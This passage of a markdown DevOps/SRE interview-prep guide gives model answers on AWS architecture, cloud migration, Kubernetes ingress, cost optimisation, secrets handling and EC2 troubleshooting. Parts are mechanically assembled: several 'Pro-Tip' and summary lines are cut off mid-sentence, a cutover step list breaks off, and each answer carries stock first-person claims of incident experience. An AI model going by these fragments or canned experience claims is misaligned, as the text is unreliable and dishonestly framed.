- **Runtime Auditing:** Falco runtime threat detection + AWS GuardDuty EKS Protection.

##### 5️⃣ Full-Stack Observability & Disaster Recovery

Unified telemetry and business continuity:

- **Distributed Telemetry:** OpenTelemetry collector agents forwarding metrics to Prometheus/Grafana, logs to Loki/OpenSearch, and traces to Tempo/Jaeger with W3C tracecontext headers.
- **SLO/SLI Alerting:** Multi-window burn rate alerts sent to PagerDuty based on error budget depletion.
- **Disaster Recovery (RPO < 1m, RTO < 15m):** Route 53 DNS failover with health checks. Aurora Global Databases replicating across a secondary AWS region with automated cross-region S3 backup replication.

#### 🎯 Key Architectural Takeaway
> Achieving scale and 99.99% availability isn't about bigger machines: it's CloudFront/WAF edge caching, 3-AZ VPC with Karpenter + KEDA autoscaling, Aurora Multi-AZ with Redis caching, and zero-trust IAM with OpenTelemetry correlation.

#### ⏱️ 60-Second Elevator Pitch Summary

- Edge & Ingress: CloudFront + WAF + Shield -> ALB with IP Target Mode into multi-AZ EKS cluster.
- Compute & Autoscaling: EKS with Karpenter for sub-minute node scaling; HPA + KEDA for event-driven pod scaling.
- Data Tier: Multi-AZ Aurora PostgreSQL with auto-scaling read replicas + ElastiCache Redis cluster for 80%+ cache hit ratio.
- Security: IRSA for pod IAM, External Secrets Operator, Cilium NetworkPolicies (default-deny), KMS encryption.
- Observability: OpenTelemetry pipeline -> Prometheus, Loki, Tempo with trace_id correlation across all logs.
- DR: Pilot light / warm standby in secondary region with Aurora Global Database and Route 53 health-check failover.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-12-migrating-a-large-production-workload-from-on-premises-to-aws-with-minimal-downtime"></a>
### 12. Migrating a Large Production Workload from On-Premises to AWS with Minimal Downtime

**Level:** `Staff / Principal SRE` | **Category:** `Cloud Migration` • `Enterprise Cloud Adoption` | **Type:** `Enterprise Migration`

**Tags:** `Cloud Migration` `AWS` `Direct Connect` `DMS` `CDC`

> **Interview Question:**  
> *"Scenario: Your organization needs to migrate a large production workload from on-premises infrastructure to AWS/Azure with minimal downtime and no major service disruption. Explain your migration strategy, dependency mapping, networking, data replication, security, IaC, testing, cutover, rollback, and post-migration optimization."*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
Migrating enterprise workloads with near-zero downtime requires decoupling the migration into distinct phases: hybrid network foundation, continuous data synchronization with Change Data Capture (CDC), and a low-risk DNS/router cutover with an instant rollback mechanism.

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Discovery, Dependency Mapping & Classification (The 7 Rs)

Audit and assess every service before touching infrastructure:

- **Automated Dependency Mapping:** Deploy agents (AWS Application Discovery Service / Cloudamize) to discover server inventory, inter-service network dependencies, throughput, and database topologies.
- **Classify by Migration Strategy (7 Rs):** *Rehost* (lift-and-shift via AWS Application Migration Service/MGN), *Replatform* (move databases to managed AWS Aurora, apps to EKS), or *Refactor*.
- Identify hard constraints: latency-sensitive database dependencies and regulatory compliance boundaries.

##### 2️⃣ Hybrid Networking & Landing Zone Foundation

Establishing high-throughput, secure communication:

- **AWS Control Tower Landing Zone:** Multi-account structure with Core Services, Security/Audit, and Environment accounts.
- **Dedicated Hybrid Connectivity:** **AWS Direct Connect (DX)** with 10Gbps dedicated connection and IPSec VPN backup over internet.
- **AWS Transit Gateway (TGW):** Interconnects on-premises data centers with multiple AWS VPCs.
- **Hybrid DNS:** Route 53 Resolver Inbound and Outbound Endpoints enabling bi-directional domain resolution between on-prem Active Directory and AWS.

##### 3️⃣ Continuous Data Replication (Change Data Capture - CDC)

Eliminating data transfer downtime during cutover:

- **Database Replication (AWS DMS):** Full load migration followed by continuous **Change Data Capture (CDC)** from on-prem Oracle/PostgreSQL to Amazon Aurora. Transactions stream in real-time with sub-second replication lag.
- **Storage & Files (AWS DataSync):** Continuously synchronizes on-premises NAS/SAN file shares to Amazon EFS / S3.
- **Target IaC:** Recreate the entire target architecture declaratively in Terraform (EKS, RDS, SQS, Security Groups).

##### 4️⃣ Dry-Run Testing, Cutover & Reverse Rollback

Executing the cutover with minimum downtime (<5 minutes):

- **Pre-Cutover Testing:** Deploy application on AWS EKS; run load testing and security scans against the Aurora read replica.
- **DNS Preparation:** Reduce Route 53 DNS TTL to 60 seconds one week in advance.
- **Cutover Window (Scheduled off-peak):**1. Put on-premises application in read-only mode.2. Wait for final AWS DMS replication lag to reach zero (typically 3. Promote AWS Aurora to primary writer.4. Switch Route 53 DNS / CloudFront origin to point to AWS ALB.5. Validate live traffic.
- **The Safety Net (Reverse CDC Rollback):** Configure reverse DMS replication from AWS Aurora **back to on-premises** for the first 72 hours. If a catastrophic unforeseen bug occurs in cloud, traffic can flip back to on-prem with ZERO data loss!

##### 5️⃣ Post-Migration Optimization

Cost reduction and cloud-native refinement:

- Right-size EC2/EKS compute using AWS Compute Optimizer.
- Decommission Direct Connect and legacy on-premises hardware.
- Purchase AWS Savings Plans / Reserved Instances to cut compute costs by 40%+.

#### 🎯 Key Architectural Takeaway
> Near-zero downtime migration is achieved by pre-syncing data with AWS DMS CDC (Change Data Capture) over Direct Connect, lowering DNS TTL to 60s, and configuring reverse CDC back to on-prem as an instant safety rollback net.

#### ⏱️ 60-Second Elevator Pitch Summary

- Phase 1 (Discovery): Map dependencies via AWS Discovery Service; classify workloads using 7 Rs framework.
- Phase 2 (Hybrid Network): 10G AWS Direct Connect + Transit Gateway + Route 53 Resolver endpoints for hybrid DNS.
- Phase 3 (Data Sync): AWS DMS with continuous Change Data Capture (CDC) to keep Aurora in real-time sync with on-prem DB.
- Phase 4 (Testing): Terraform deploys target EKS/Aurora; execute load and security testing against cloud replica.
- Phase 5 (Cutover & Rollback): Set DNS TTL to 60s, set on-prem read-only, promote Aurora, flip DNS. Keep reverse CDC active for 72h rollback safety.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-13-ingress-controller-end-to-end-osi-layer-7-traffic-flow"></a>
### 13. Ingress Controller — End-to-End OSI Layer 7 Traffic Flow

**Level:** `Senior DevOps / SRE` | **Category:** `Kubernetes` • `Networking & Ingress` | **Type:** `Core Networking`

**Tags:** `Kubernetes` `Ingress` `Ingress Controller` `NGINX` `ALB`

> **Interview Question:**  
> *"Explain Ingress Controller. What is the difference between Ingress resource, Ingress Controller, and Service?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
Candidates often confuse the declarative Ingress YAML with the actual reverse proxy software. Ingress requires two components: the declarative API rule and an active controller running in the cluster.

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ The Three Discrete Layers (Resource vs Controller vs Service)

Understanding the separation of concerns:

- 📄 **Ingress Resource:** A Kubernetes API object (YAML) that defines routing rules: hostnames, URL path prefixes (/api, /auth), and TLS certificate secrets.
- ⚙️ **Ingress Controller:** The actual running proxy application (Ingress-NGINX, Traefik, AWS Load Balancer Controller, or Azure AGIC) that reads Ingress resources and dynamically reconfigures its routing table.
- 🔌 **Kubernetes Service:** An internal ClusterIP abstraction that provides a stable virtual IP and tracks healthy Pod IPs via Endpoints/EndpointSlices.

##### 2️⃣ End-to-End Traffic Flow (Internet to Application)

How an HTTP request traverses the layers:

- 1. User accesses `https://api.example.com/checkout`.
- 2. DNS resolves to the Cloud Load Balancer (AWS ALB, Azure App Gateway, or NLB).
- 3. Load balancer forwards traffic to the Ingress Controller Pods running in the cluster.
- 4. The Ingress Controller evaluates its in-memory routing table: matches host `api.example.com` and path `/checkout`.
- 5. **The Performance Secret:** Modern ingress controllers (like NGINX) bypass the `kube-proxy` ClusterIP NAT hop and route directly to the backend Pod IP discovered via the Kubernetes Endpoints API.

**Execution Flow:** `Client DNS Request` ➔ `Cloud Load Balancer (ALB/AGIC)` ➔ `Ingress Controller Pods` ➔ `Bypass kube-proxy (Endpoints)` ➔ `Target Pod IP`

##### 3️⃣ Production Add-Ons: TLS & Security

Essential components paired with Ingress Controllers in enterprise setups:

- **Cert-Manager:** Automates Let's Encrypt / enterprise PKI SSL certificate issuance and renewal into Kubernetes TLS secrets.
- **IngressClass:** Decouples cluster from specific controllers, allowing multiple ingress controllers (e.g. internal vs public) in one cluster.
- **WAF & Rate Limiting:** Ingress controllers inject annotations for rate-limiting (`limit-rps`), IP whitelisting, and WAF protection.

#### 🎯 Key Architectural Takeaway
> An Ingress Resource is just a passive config manifest. Without an active Ingress Controller pod listening to the Kubernetes API, your ingress rules do nothing. High-performance controllers route directly to Pod IPs via EndpointSlices rather than bouncing through kube-proxy.

#### ⏱️ 60-Second Elevator Pitch Summary

- Ingress Resource is the YAML routing specification (hosts, paths, TLS secrets).
- Ingress Controller is the active reverse proxy daemon (NGINX, Traefik, Envoy, AWS ALB Controller) executing the rules.
- Service is the backend abstraction; the Ingress Controller watches Service Endpoints to stream traffic directly to container IPs.
- Client -> Cloud LB -> Ingress Controller Pod -> Evaluates Host/Path Rules -> Direct connection to target Pod IP.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-14-cloud-cost-optimization-across-dev-qa-uat-and-production"></a>
### 14. Cloud Cost Optimization Across Dev, QA, UAT, and Production

**Level:** `Senior DevOps / SRE` | **Category:** `FinOps & Cost` • `Cloud Economics & Tiering` | **Type:** `FinOps Strategy`

**Tags:** `FinOps` `Cost Optimization` `AWS` `Azure` `Spot Instances`

> **Interview Question:**  
> *"For a project, how would you optimize costs for each environment? What strategies reduce cloud costs without affecting application availability?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
Cost optimization is not about cutting resources blindly; it is about aligning infrastructure tiering to business risk. Lower environments can tolerate interruptions; Production demands zero downtime.

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Dev & QA: Aggressive Cost Elimination (60–80% Savings)

Non-production environments sit idle 70% of the week (nights and weekends):

- **Automated Business-Hours Shutdown:** Use tools like `kube-downscaler` or AWS Instance Scheduler to scale all deployments to 0 replicas and stop RDS databases outside 8 AM - 7 PM weekdays.
- **100% Spot Instances / Low-Priority VMs:** Dev/QA nodes run entirely on EC2 Spot or Azure Spot VMs, slashing compute costs by up to 70-80%.
- **Single Replica & Cluster Sharing:** Disable multi-AZ; run 1 replica per service; share a single EKS/AKS cluster across Dev and QA using namespace isolation and ResourceQuotas.

##### 2️⃣ UAT & Staging: Production-Parity on Demand

Balancing testing fidelity with cost:

- **On-Demand Spin-Up:** Spin up full UAT performance environments on-demand via Terraform/GitOps for staging test cycles, then tear them down immediately post-validation.
- **Single-AZ Databases with Auto-Pause:** Use Aurora Serverless v2 or Azure SQL Serverless with auto-pause enabled during inactivity.

##### 3️⃣ Production: Availability First + Architectural Efficiency

Cost optimization in Production must NEVER compromise availability:

- **Savings Plans & Reserved Instances:** Cover predictable baseline compute (e.g. minimum 10 nodes) with 1- or 3-year Compute Savings Plans for 40-60% discounts.
- **ARM64 / Graviton / Ampere Architecture:** Migrate EKS/AKS workloads to AWS Graviton3 or Azure Ampere Altra instances for 20% better performance at 20% lower cost.
- **Strategic Spot for Stateless Workers:** Run stateless async background processors (SQS consumers, batch jobs) on Spot nodes with termination notices handled by AWS Node Termination Handler.

#### 🎯 Key Architectural Takeaway
> Tier cost strategy by environment: Dev/QA get scheduled off-hours shutdowns and 100% Spot instances; Staging uses on-demand ephemeral environments; Production achieves 40%+ savings via Compute Savings Plans, ARM64 Graviton instances, and Karpenter consolidation without touching uptime SLAs.

#### ⏱️ 60-Second Elevator Pitch Summary

- Dev & QA: Schedule off-hours shutdown (scale to 0 outside 9-6 via kube-downscaler); run 100% Spot VMs; share 1 cluster with namespaces.
- UAT: Ephemeral environments spun up via Terraform for test runs; use Aurora/SQL Serverless with auto-pause.
- Production: Never sacrifice HA. Use 1-3 year Compute Savings Plans for baseline load (40% discount).
- Hardware efficiency: Adopt AWS Graviton3 / ARM instances for 20% cost reduction with better CPU performance.
- Storage: S3 Intelligent-Tiering and automated deletion lifecycle rules for old snapshots and build artifacts.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-15-detecting-eliminating-unused-orphaned-cloud-resources"></a>
### 15. Detecting & Eliminating Unused / Orphaned Cloud Resources

**Level:** `Senior DevOps / SRE` | **Category:** `FinOps & Cost` • `Cloud Governance & Hygiene` | **Type:** `Cost Hygiene`

**Tags:** `FinOps` `AWS` `Azure` `Cost Explorer` `Orphaned Disks`

> **Interview Question:**  
> *"How would you identify unused or over-provisioned cloud resources?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
In every production cloud account over 1 year old, 15 to 25% of the monthly spend consists of 'zombie' or orphaned resources left behind by deleted clusters, test VMs, or failed CI pipelines.

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ The Top 5 Orphaned Cloud Culprits

Where ghost money leaks every month:

- **Unattached EBS Volumes / Azure Managed Disks:** When an EC2/VM is deleted, attached persistent volumes often remain (status `available` or unattached), continuing to bill per GB-month.
- **Unassociated Elastic IPs / Public IPs:** Cloud providers charge an hourly penalty fee for allocated public IPs that are NOT attached to a running instance.
- **Idle Load Balancers (ALB/NLB):** Abandoned load balancers with 0 healthy targets or 0 request count that bill base hourly fees (~$25+/mo each).
- **Old Snapshots & AMIs:** EBS snapshots from deleted instances retained for years without retention lifecycles.
- **Orphaned NAT Gateways:** Idle NAT Gateways left running in obsolete testing VPCs billing ~$35/mo base + data transfer.

##### 2️⃣ Discovery Tools & Automated Auditing

How senior teams automate identification:

- **AWS Compute Optimizer & Cost Explorer:** Flags over-provisioned EC2/RDS instances and underutilized EBS volumes.
- **Azure Advisor:** Generates automated Cost recommendations for idle virtual network gateways, unused disks, and downsized VMs.
- **KubeCost / OpenCost:** In-cluster real-time allocation tool that breaks down Kubernetes spend by namespace, deployment, and orphaned persistent volumes.
- **Cloud Custodian:** Open-source policy engine running automated custodial crons to tag and auto-terminate unattached volumes older than 7 days.

##### 3️⃣ Quick CLI Audit Commands

Run immediately to find leaks:

- AWS Unattached EBS: `aws ec2 describe-volumes --filters Name=status,Values=available --query 'Volumes[*].[VolumeId,Size,CreateTime]' --output table`
- AWS Unassociated IPs: `aws ec2 describe-addresses --query 'Addresses[?NetworkInterfaceId==null].[PublicIp,AllocationId]' --output table`
- Azure Unattached Disks: `az disk list --query '[?managedBy==null].[name,resourceGroup,diskSizeGb]' -o table`

#### 🎯 Key Architectural Takeaway
> Implement continuous cloud hygiene: Audit for unattached EBS/managed disks, unassociated public IPs, and zero-target load balancers using AWS Compute Optimizer, Azure Advisor, and CLI query filters. Automate cleanup with Cloud Custodian policies.

#### ⏱️ 60-Second Elevator Pitch Summary

- Top leaks: Unattached EBS/managed disks, unassociated Elastic IPs, idle ALBs with 0 targets, and forgotten NAT Gateways.
- Discovery tools: AWS Cost Explorer / Compute Optimizer, Azure Advisor Cost blade, and KubeCost for in-cluster visibility.
- Fast CLI checks: 'aws ec2 describe-volumes --filters Name=status,Values=available' to instantly find orphan storage.
- Automated prevention: Cloud Custodian or Lambda janitor scripts to notify Slack and terminate unattached disks after 7 days.
- Enforce mandatory tagging ('Environment', 'Owner', 'Project') in Terraform so untagged rogue resources cannot be created.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-16-managing-secrets-securely-in-kubernetes-external-secrets-operator-eso"></a>
### 16. Managing Secrets Securely in Kubernetes — External Secrets Operator (ESO)

**Level:** `Senior DevOps / DevSecOps` | **Category:** `DevSecOps & Security` • `Secret Governance` | **Type:** `Secret Governance`

**Tags:** `Kubernetes` `Secrets` `External Secrets Operator` `AWS Secrets Manager` `Azure Key Vault`

> **Interview Question:**  
> *"How do you manage secrets securely in Kubernetes?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
Kubernetes native Secret objects are only base64-encoded plain text—they are NOT encrypted by default. In enterprise production, we NEVER store secrets in Git or YAML files. We sync them dynamically using External Secrets Operator (ESO).

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ The Native Secret Trap & Plaintext in Git

Why native Kubernetes secrets fail enterprise compliance:

- Base64 encoding is not encryption: `echo 'cGFzc3dvcmQ=' | base64 -d` takes 1 millisecond.
- If developer commits a Secret manifest to Git, the secret is permanently recorded in Git history.
- In etcd, secrets are stored unencrypted unless **EncryptionAtRest** (using AWS KMS or Azure Key Vault KMS plugin) is explicitly enabled on the API server.

##### 2️⃣ Production Standard: External Secrets Operator (ESO)

How External Secrets Operator bridges cloud vaults to Kubernetes:

- **Source of Truth:** Secrets are maintained and rotated inside **AWS Secrets Manager**, **Azure Key Vault**, or **HashiCorp Vault**.
- **SecretStore CRD:** Configures authentication to the cloud vault using AWS IRSA or Azure Workload Identity (passwordless).
- **ExternalSecret CRD:** A safe Git-committable manifest that specifies which remote secret key to fetch and how often to refresh (e.g. `refreshInterval: 1h`).
- **Auto-Reconciliation:** ESO continuously syncs the remote secret into an in-cluster native Kubernetes Secret automatically.

**Execution Flow:** `Cloud Secret Store (AKV/AWS SM/Vault)` ➔ `SecretStore CRD (IAM/Workload Identity)` ➔ `ExternalSecret Manifest (Git Safe)` ➔ `Kubernetes Secret (Auto-Generated)`

##### 3️⃣ Secure Pod Consumption: Volume Mounts vs Env Vars

How the pod should consume the secret securely:

- **Avoid Plaintext Env Vars:** Environment variables (`envFrom.secretRef`) can leak into application error crash dumps, child process forks, and `/proc/&lt;pid&gt;/environ`.
- **Preferred Practice (Volume Mounts):** Mount secrets as file volumes into `/etc/secrets`. In Kubernetes, secret volumes are backed by **tmpfs (RAM only)**, meaning they are never written to physical node disk storage.

#### 🎯 Key Architectural Takeaway
> Never store secrets in Git. Keep the source of truth in AWS Secrets Manager, Azure Key Vault, or HashiCorp Vault. Use External Secrets Operator (ESO) with Workload Identity to sync them into in-memory Kubernetes Secrets, and mount them as tmpfs file volumes rather than environment variables.

#### ⏱️ 60-Second Elevator Pitch Summary

- Kubernetes Secrets are just base64 plain text; storing them in Git is a critical security vulnerability.
- Single Source of Truth: Store secrets in AWS Secrets Manager, Azure Key Vault, or HashiCorp Vault with automated rotation.
- Syncing Engine: Deploy External Secrets Operator (ESO). The Git repo only contains ExternalSecret manifests pointing to secret paths.
- Authentication: ESO authenticates to cloud vaults via AWS IRSA or Azure Workload Identity (zero hardcoded cloud keys).
- In-Pod consumption: Mount secrets as tmpfs RAM-backed file volumes instead of environment variables to prevent leak in crash logs.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-17-aws-q1-you-launched-an-ec2-instance-but-cant-ssh-into-it-what-do-you-check-l1"></a>
### 17. AWS Q1: You launched an EC2 instance but cant SSH into it What do you check [L1]

**Level:** `Junior / Associate DevOps [L1]` | **Category:** `AWS` • `EC2 & Compute` | **Type:** `Core Fundamentals [L1]`

**Tags:** `AWS` `EC2 & Compute` `L1` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"You launched an EC2 instance but can't SSH into it. What do you check?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our AWS cloud environment, we managed high-traffic microservices where this exact scenario occurred. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

---

- **Security Group** — does inbound rule allow port 22 from your IP? Check in the EC2 console under Security Groups.
- **Key pair** — are you using the correct `.pem` file? Is it the right one for that instance?
- **File permissions** — `chmod 400 key.pem`. SSH won't work if key permissions are too open.
- **Instance state** — is it running? Not stopped or pending?

##### 2️⃣ Remediation & Permanent Safeguards

Execute the resolution runbook and verify workload health:

- **Public IP** — does it have a public IP or Elastic IP assigned?
- **VPC/Subnet** — is it in a public subnet with an Internet Gateway? A private subnet instance can't be SSH'd from internet.
- **NACL** — Network ACLs can block traffic even if Security Groups allow it. NACLs are stateless.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Security Group — does inbound rule allow port 22 from your IP? Check in the EC2 console under Security Groups..

#### ⏱️ 60-Second Elevator Pitch Summary

- Security Group — does inbound rule allow port 22 from your IP? Check in the EC2 console under Sec...
- Key pair — are you using the correct .pem file? Is it the right one for that instance?
- File permissions — chmod 400 key.pem. SSH won't work if key permissions are too open.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-18-aws-q2-your-ec2-instance-is-showing-high-cpu-and-your-application-is-slow-what-steps-do-you-take-l2"></a>
### 18. AWS Q2: Your EC2 instance is showing high CPU and your application is slow What steps do you take [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `EC2 & Compute` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `EC2 & Compute` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"Your EC2 instance is showing high CPU and your application is slow. What steps do you take?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When an interviewer asks how I troubleshoot this in AWS, I frame it through my hands-on production experience. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

---

- **CloudWatch metrics** — check CPU utilization over time. Is it sustained or spiky?
- **SSH in and check** — `top` or `htop` to see which process is consuming CPU.
- **Check for runaway processes** — a stuck process, an infinite loop, a cron job misfiring.
- **Check memory** — sometimes high CPU is actually a memory issue causing constant swap. Check `free -m` and `vmstat`.

##### 2️⃣ Remediation & Permanent Safeguards

Execute the resolution runbook and verify workload health:

- **Scale vertically** — if it's a legitimate load, stop the instance, change instance type to a larger one, restart.
- **Scale horizontally** — add it to an Auto Scaling Group, put a Load Balancer in front, scale out.
- **Right-sizing** — use AWS Compute Optimizer recommendations.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: CloudWatch metrics — check CPU utilization over time. Is it sustained or spiky?.

#### ⏱️ 60-Second Elevator Pitch Summary

- CloudWatch metrics — check CPU utilization over time. Is it sustained or spiky?
- SSH in and check — top or htop to see which process is consuming CPU.
- Check for runaway processes — a stuck process, an infinite loop, a cron job misfiring.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-19-aws-q3-you-have-a-fleet-of-ec2-instances-behind-an-alb-one-instance-keeps-getting-traffic-even-though-its-unhealthy-whats-wrong-l2"></a>
### 19. AWS Q3: You have a fleet of EC2 instances behind an ALB One instance keeps getting traffic even though its unhealthy Whats wrong [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `EC2 & Compute` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `EC2 & Compute` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"You have a fleet of EC2 instances behind an ALB. One instance keeps getting traffic even though it's unhealthy. What's wrong?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In a previous role, our monitoring paged me for a similar incident across our AWS VPC infrastructure. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

The ALB health check is likely misconfigured:

- **Health check path wrong** — ALB checks `/` but the app serves health at `/health`. Returns 404 → ALB marks it unhealthy → but wait, 404 might be in the success codes range.
- **Success codes misconfigured** — if success codes include `404` or `5xx`, unhealthy instances appear healthy.
- **Health check threshold** — `UnhealthyThreshold` might be set very high, so the instance needs to fail many times before being marked unhealthy.

##### 2️⃣ Remediation & Permanent Safeguards

Fix: Review ALB target group health check settings. Set correct path, success codes (200-299 only), and reasonable thresholds. ---

- **Health check port/protocol wrong** — checking wrong port.
- **Security Group** — ALB can't reach the instance's health check port → health checks time out → AWS treats timeout differently than explicit failure in some configs.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Health check path wrong — ALB checks / but the app serves health at /health. Returns 404 → ALB marks it unhealthy → but wait, 404 .

#### ⏱️ 60-Second Elevator Pitch Summary

- Health check path wrong — ALB checks / but the app serves health at /health. Returns 404 → ALB ma...
- Success codes misconfigured — if success codes include 404 or 5xx, unhealthy instances appear hea...
- Health check threshold — UnhealthyThreshold might be set very high, so the instance needs to fail...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-20-aws-q4-an-ec2-instance-in-an-auto-scaling-group-keeps-being-terminated-and-replaced-the-new-instance-starts-becomes-healthy-then-gets-terminated-again-in-a-cycle-whats-happening-l3"></a>
### 20. AWS Q4: An EC2 instance in an Auto Scaling Group keeps being terminated and replaced The new instance starts becomes healthy then gets terminated again in a cycle Whats happening [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `AWS` • `EC2 & Compute` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `AWS` `EC2 & Compute` `L3` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"An EC2 instance in an Auto Scaling Group keeps being terminated and replaced. The new instance starts, becomes healthy, then gets terminated again in a cycle. What's happening?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"AWS reliability requires differentiating between AWS control plane limits and host-level resource exhaustion. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

This sounds like a lifecycle hook or health check issue:

- **Application actually is unhealthy** — the new instance really is failing. Check the health check endpoint. Maybe there's a deployment bug.
- **ALB health check failing immediately** — instance isn't ready to serve traffic before health checks kick in. The ASG uses ALB health checks and terminates the instance before the app is fully started.
- **Lifecycle hook stuck** — a lifecycle hook (`autoscaling:EC2_INSTANCE_LAUNCHING`) is not completing. Instance is in `Pending:Wait` state but something is killing it.

##### 2️⃣ Remediation & Permanent Safeguards

Check ASG activity logs in the console — it will say exactly why each instance was terminated. ---

- **Scale-in protection not set** — instance is being terminated by scale-in event despite looking fine.
- **EC2 instance reachability check failing** — hardware issue at the hypervisor level. Check AWS console system status checks.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Application actually is unhealthy — the new instance really is failing. Check the health check endpoint. Maybe there's a deploymen.

#### ⏱️ 60-Second Elevator Pitch Summary

- Application actually is unhealthy — the new instance really is failing. Check the health check en...
- ALB health check failing immediately — instance isn't ready to serve traffic before health checks...
- Lifecycle hook stuck — a lifecycle hook (autoscaling:EC2_INSTANCE_LAUNCHING) is not completing. I...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-21-aws-q5-you-want-ec2-instances-in-private-subnets-to-download-packages-from-the-internet-like-yum-install-how-do-you-enable-this-l2"></a>
### 21. AWS Q5: You want EC2 instances in private subnets to download packages from the internet (like yum install) How do you enable this [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `EC2 & Compute` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `EC2 & Compute` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"You want EC2 instances in private subnets to download packages from the internet (like `yum install`). How do you enable this?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our AWS cloud environment, we managed high-traffic microservices where this exact scenario occurred. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

Use a **NAT Gateway** (managed by AWS) or **NAT Instance** (self-managed EC2):

- Create a NAT Gateway in a **public subnet** (must have internet access).
- Assign an Elastic IP to the NAT Gateway.
- Update the **route table** for the private subnets: add route `0.0.0.0/0 → NAT Gateway`.

##### 2️⃣ Remediation & Permanent Safeguards

Now private instances can initiate outbound connections to the internet (for package downloads), but the internet can't initiate connections inbound to them. NAT Gateway vs NAT Instance: NAT Gateway is fully managed, highly available, auto-scales. NAT Instance is cheaper for low traffic but you manage it. ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Create a NAT Gateway in a public subnet (must have internet access)..

#### ⏱️ 60-Second Elevator Pitch Summary

- Create a NAT Gateway in a public subnet (must have internet access).
- Assign an Elastic IP to the NAT Gateway.
- Update the route table for the private subnets: add route 0.0.0.0/0 → NAT Gateway.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-22-aws-q6-your-on-demand-ec2-costs-are-very-high-how-would-you-optimize-l3"></a>
### 22. AWS Q6: Your On-Demand EC2 costs are very high How would you optimize [L3]

